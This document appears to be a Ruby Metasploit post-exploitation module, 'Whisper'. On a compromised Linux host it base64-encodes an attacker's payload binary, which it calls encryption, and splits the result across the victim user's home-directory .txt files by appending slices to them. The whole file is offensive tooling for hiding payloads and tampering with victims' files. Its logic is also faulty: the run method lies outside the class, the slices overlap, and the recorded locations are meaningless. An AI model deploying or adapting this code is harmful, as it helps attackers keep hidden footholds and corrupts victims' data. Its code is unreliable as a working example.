##########################################################################################
#             .---.   ,---,                                                              #
#            /. ./| ,--.' |       ,--,                 ,-.----.                          #
#        .--'.  ' ; |  |  :     ,--.'|                 \    /  \               __  ,-.   #
#       /__./ \ : | :  :  :     |  |,       .--.--.    |   :    |            ,' ,'/ /|   #
#   .--'.  '   \' . :  |  |,--. `--'_      /  /    '   |   | .\ :    ,---.   '  | |' |   #
#  /___/ \ |    ' ' |  :  '   | ,' ,'|    |  :  /`./   .   : |: |   /     \  |  |   ,'   #
#  ;   \  \;      : |  |   /' : '  | |    |  :  ;_     |   |  \ :  /    /  | '  :  /     #
#   \   ;  `      | '  :  | | | |  | :     \  \    `.  |   : .  | .    ' / | |  | '      #
#    .   \    .\  ; |  |  ' | : '  : |__    `----.   \ :     |`-' '   ;   /| ;  : |      #
#     \   \   ' \ | |  :  :_:,' |  | '.'|  /  /`--'  / :   : :    '   |  / | |  , ;      #
#      :   '  |--"  |  | ,'     ;  :    ; '--'.     /  |   | :    |   :    |  ---'       #
#       \   \ ;     `--''       |  ,   /    `--'---'   `---'.|     \   \  /              #
#        '---"                   ---`-'                  `---`      `----'               #
# v1.0                                                                                   #
##########################################################################################
# Adonay Pichardo

# Post-Exploitation script to encrypt and copy payload-binaries into other files to avoid
# leaving payload-binaries unencrypted, centralized, and exposed, should attacker become
# disconnected from target machine.

# 1. Get list of .txt files current user has in their home directory
# 2. Begin encrypting payload-binaries
# 3. Splice encrypted payload-binaries into smaller files
# 4. Append encrypted splices to editable files

require 'base64'

class MetasploitModule < Msf::Post
    include Msf::Post::File

    def initialize(info={})
        super(update_info(info,
            'Name'         => 'Whisper',
            'Description'  => %q{Hides files in other files.},
            'License'      => MSF_LICENSE,
            'Author'       => ['Adonay Pichardo'],
            'Platform'     => ['linux'],
            'SessionTypes' => ['meterpreter', 'shell']
        ))
    end
end

class Whisper
    @@whisperLocation = {}

    def setWhisperLocation(fileName, location)
        @@whisperLocation[fileName] = location
    end

    def getWhisperLocation(fileName)
        return @@whisperLocation[fileName]
    end
end

def run

    whisper = Whisper.new()

    # Encrypt payload binary
    payload       = "/home/kali/whisper/payload/dummy.bin"
    print_good("Payload binary set to:_> #{payload}")
    inputFile     = File.open(payload, 'r')
    inputFile     = inputFile.read()
    encryptedData = Base64.encode64(inputFile)

    # Get list of .txt files on remote machine in '~' directory
    currentUser = get_env('USER')
    print_good("Current User set to:_> #{currentUser}")
    print_good("Searching files in:_> /home/#{currentUser}")
    allFiles    = dir("/home/#{currentUser}")
    print_good("Files found:_> #{allFiles}")

    # Get all text files
    textFiles = []
    allFiles.each {
        |file|
        if file.include? ".txt"
            textFiles.append(file)
        end
    }

    indexStart = 0
    indexStep  = encryptedData.size / textFiles.size
    indexEnd   = indexStep

    textFiles.each {
        |file|
        append_file(file, encryptedData[indexStart..indexEnd])
        whisper.setWhisperLocation(file, (textFiles.size + 1))

        indexStart = indexEnd
        indexEnd  += indexStep
    }

    textFiles.each {
        |file|
        print_good(whisper.getWhisperLocation(file))
    }
end
